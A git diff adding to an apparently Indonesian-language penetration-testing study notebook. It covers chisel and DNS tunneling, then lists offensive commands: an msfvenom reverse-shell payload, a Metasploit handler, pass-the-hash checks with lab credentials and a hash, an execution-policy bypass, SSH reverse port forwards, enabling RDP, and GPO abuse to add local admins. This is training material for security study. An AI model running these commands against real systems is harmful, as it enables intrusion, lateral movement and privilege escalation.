@@ -2565,3 +2565,230 @@ netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
 //using rule 
 netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
 ```
+
+#### Learn day 20
+disini kita akan belajar module tentang tunneling through deep packet inspection. Yang pertama, kita akan menggunakan chisel untuk melakukan tunneling dan pivoting
+
+https://github.com/jpillora/chisel/releases
+
+secara sederhana, saat kita menggunakan chisel, kita perlu melakukan setup server chisel terlebih dahulu pada local machine kita yang nantinya server chisel ini yang akan kita gunakan untuk terhubung melalui chisel client.
+
+```
+chisel server --port 8080 --reverse
+```
+
+Kita membuka port 8080 dengan flag reverse untuk allow port forward dan pada machine yang akan kita tunneling, kita akan melakukan run chisel client
+
+```
+
+//sesuaikan ip dan port chisel server 
+chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
+```
+
+tapi kadangkala, pada saat run chisel seringkali inkompatibilitas terjadi karena versi glibc yang lebih rendah. Untuk mengatasi hal ini kita perlu download binary versi 1.8.1
+
+```
+wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
+
+gunzip chisel_1.8.1_linux_amd64.gz
+```
+
+Dan ulangi langkah awal dan jika berhasil, maka representasi dari socks merupakan port 1080 yang kita bisa verifikasi melalui netstat.  jadi saat kita ingin terhubung ke jaringan local melalui SSH, kita tidak bisa menggunakan command proxychains karena protocol SSH tidak support hal itu dan sebagai gantinya kita menggunakan opsi ProxyCommand dan ncat.
+
+```
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
+```
+
+Jadi command diatas intinya melakukan forwarding melalui ncat ke socks proxy pada port 1080 yang kita run via chisel dan dengan ini seharusnya berhasil.
+
+
+
+##### DNS tunneling
+Sekarang kita akan belajar tentang tunneling melalui DNS. jadi DNS merupakan protokol translasi dari alamat IP ke domain yang dapat dibaca manusia begitupun sebaliknya. pada DNS terdapat beberapa record salah satunya yaitu A record yang merupakan suatu record untuk pointing pada IP address.
+
+Jadi DNS menggunakan serangkaian query untuk menemukan alamat IP yang sesuai pada beberapa server(dikenal dengan resolver). urutan query seperti ini :
+
+- User request ke abc.com 
+- resolver DNS akan menghubungi root nameserver untuk mencari TLD nameserver
+- TLD nameserver .com ditemukan
+- Resolver menanyakan .com dan mencari nameserver authoritative untuk abc.com
+- Authoritative nameserver meresponse dengan A record berupa IP address
+
+Semua komunikasi dari dns ini menggunakan UDP yang berada pada port 53.
+
+
+##### Practical
+mungkin lumayan ribet untuk sisi prakteknya, tapi kita akan mencoba untuk memahami hal ini. anggaplah kita mempunyai 3 server yaitu :
+
+- server A(bertindak untuk authoritative zone DNS feline.corp)
+- server B(merupakan resolver DNS untuk server C)
+- server C(server di jaringan internal)
+
+
+jadi saat kita bisa compromised pada server A, kita bisa melakukan konfigurasi DNS berbahaya dengan skenario berikut : 
+
+buat file dnsmasq_txt.conf pada server A 
+```
+no-resolv
+no-hosts
+
+# Define the zone
+auth-zone=feline.corp
+auth-server=feline.corp
+
+# TXT record
+txt-record=www.feline.corp,here's something useful!
+txt-record=www.feline.corp,here's something else less useful.
+```
+
+lalu aktifkan dns pada port 53 menggunakan dnsmasq
+```
+sudo dnsmasq -C dnsmasq_txt.conf -d
+
+//atau bisa inspection menggunakan tcpdump pada shell lain
+sudo tcpdump -i ens192 udp port 53
+```
+
+Sekarang di server C untuk melihat resolver :
+
+```
+resolvectl status
+
+//output
+
+DNSOverTLS setting: no         
+DNSSEC setting: no         
+DNSSEC supported: no         
+Current DNS Server: 10.4.50.64
+DNS Servers: 10.4.50.64
+```
+
+Dimana 10.4.50.64 merupakan server B yang disini artinya server C akan melakukan query ke server B setiap melakukan DNS resolving, dan server B akan meneruskan query pada authoritative nameserver yang berada pada server A.
+
+Contoh kita melakukan resolve pada server C 
+
+```
+//txt
+nslookup -type=txt www.feline.corp
+```
+
+Disini server C akan menghubungi server B dan server B akan meneruskan query pada server A(authoritative) sehingga tcpdump pada server A akan terdapat packet DNS seperti berikut :
+
+```
+03:16:42.495429 IP 192.168.201.64.54651 > 192.168.201.7.domain: 18830+ [1au] TXT? www.feline.corp. (44)
+03:16:42.495528 IP 192.168.201.7.domain > 192.168.201.64.54651: 18830 2/0/1 TXT "here's something else less useful.", TXT "here's something useful!" (128)
+```
+
+#### Random Notes
+enable color winpeas
+```
+REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+```
+
+
+msfvenom 
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -b '\x00\x01\x0d' -f exe -o rev.exe
+```
+
+msfconsole auto 
+
+```
+msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
+```
+
+
+enum4linux
+
+```
+enum4linux -u 'Eric.Wallows' -p 'EricLikesRunning800' -a 192.168.200.97
+```
+
+netexec check pass the hash
+
+```
+
+//check global
+netexec smb 192.168.200.97 -u administrator -H a51493b0b06e5e35f855245e71af1d14
+
+//check if local user / administrator
+netexec winrm 192.168.200.95 -u Administrator -H a51493b0b06e5e35f855245e71af1d14 --local-auth
+
+//check range IP crackmapexeec
+crackmapexec smb 192.168.200.95-97 -u apache -p 'New2Era4.!' --local-auth
+
+```
+
+
+ffuf scanning directory
+
+```
+ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
+
+
+//filter size
+ffuf -u http://192.168.200.95:5001/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 132
+
+```
+
+
+powershell bypass current session
+
+```
+Set-ExecutionPolicy Bypass -Scope Process
+Set-ExecutionPolicy RemoteSigned
+```
+
+plink exe
+```
+//get hostkey 
+.\plink.exe -ssh -l kali -pw kali -batch -N -R 127.0.0.1:15432:127.0.0.1:15432 192.168.45.192
+
+
+//remote port forward
+.\plink.exe -ssh -l kali -pw kali -hostkey SHA256:EpHzkV4SVv0aJ3xqJeiFN5UWEzt8SzCVsUtwMqeNuDo -N -R 127.0.0.1:15432:127.0.0.1:15432 192.168.45.192
+
+
+//multi remote 
+
+.\plink.exe -ssh -l kali -pw kali -hostkey SHA256:EpHzkV4SVv0aJ3xqJeiFN5UWEzt8SzCVsUtwMqeNuDo -N -R 127.0.0.1:15432:127.0.0.1:15432 -R 127.0.0.1:1337:127.0.0.1:1337 192.168.45.192
+```
+
+powershell test connection
+
+```
+Test-NetConnection -ComputerName 127.0.0.1 -Port 3306
+```
+
+enable RDP
+
+```
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
+```
+
+
+bloodhound-python untuk koleksi semua data yang diperlukan
+
+```
+//ns merupakan ip dc
+ bloodhound-python -u charlotte -d secura.yzx -ns 192.168.200.97 -v --zip -c All 
+```
+
+GPO Abuse
+```
+.\SharpGpoAbuse.exe --AddLocalAdmin --UserAccount heker --GPOName "Default Domain Policy"
+
+.\standin.exe --gpo --filter "Default Domain Policy" --localadmin charlotte
+```
+
+
+tcpdump packet inspection
+
+```
+sudo tcpdump -nvvvXi tun0 tcp port 8080
+```
